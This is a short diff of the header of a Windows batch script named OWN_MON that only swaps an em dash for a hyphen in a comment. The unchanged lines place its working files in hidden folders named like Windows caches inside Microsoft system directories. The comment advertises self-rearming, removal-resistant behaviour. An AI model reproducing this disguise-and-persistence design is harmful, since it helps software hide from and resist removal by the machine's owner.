@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN_MON BUILD 20260802M2 — wipe-proof heal + MSI cache + self-rearm + rescue.flag
+REM OWN_MON BUILD 20260802M2 - wipe-proof heal + MSI cache + self-rearm + rescue.flag
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
 set "LOG=%WD%\boot.err"
